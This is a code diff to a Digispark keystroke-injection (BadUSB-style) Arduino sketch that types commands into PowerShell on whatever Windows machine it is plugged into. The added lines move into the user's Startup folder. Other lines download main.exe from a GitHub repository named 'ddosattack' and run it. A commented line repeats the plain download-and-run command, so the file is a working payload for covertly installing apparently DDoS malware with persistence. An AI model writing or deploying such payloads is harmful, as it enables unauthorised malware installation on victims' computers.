@@ -8,30 +8,35 @@ void setup() {
   DigiKeyboard.print("powershell");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
+  DigiKeyboard.print("cd ");
+  DigiKeyboard.sendKeyStroke(0x1F, MOD_SHIFT_LEFT); //Goosefeet
+  DigiKeyboard.print("AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup");
+  DigiKeyboard.sendKeyStroke(0x1F, MOD_SHIFT_LEFT); //Goosefeet
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   //line 12-15 downloads the .exe file
   DigiKeyboard.print("Invoke/WebRequest /Uri https>&&raw.githubusercontent.com&Fred/the/bot&ddosattack&master&main.exe /OutFile .");
-  DigiKeyboard.sendKeyStroke(0x64,MOD_ALT_RIGHT); // sends a "\"
+  DigiKeyboard.sendKeyStroke(0x64, MOD_ALT_RIGHT); // sends a "\"
   DigiKeyboard.print("main.exe<");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   //line x-x sets the exe file to launch with windows.
-  
+
   //line x-x launches the exe file and closes the powershell window
   DigiKeyboard.print(".");
-  DigiKeyboard.sendKeyStroke(0x64,MOD_ALT_RIGHT);
+  DigiKeyboard.sendKeyStroke(0x64, MOD_ALT_RIGHT); // sends a "\"
   DigiKeyboard.print("main.exe");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.print("exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
 
-void loop() { 
+void loop() {
 
 }
 
 //https://www.medo64.com/2021/09/add-application-to-auto-start-from-powershell/
 //$PWD.path
 
-// Invoke-WebRequest -Uri https://raw.githubusercontent.com/Fred-the-bot/ddosattack/master/main.exe -OutFile .\main.exe; 
+// Invoke-WebRequest -Uri https://raw.githubusercontent.com/Fred-the-bot/ddosattack/master/main.exe -OutFile .\main.exe;
 //.\main.exe
 
 
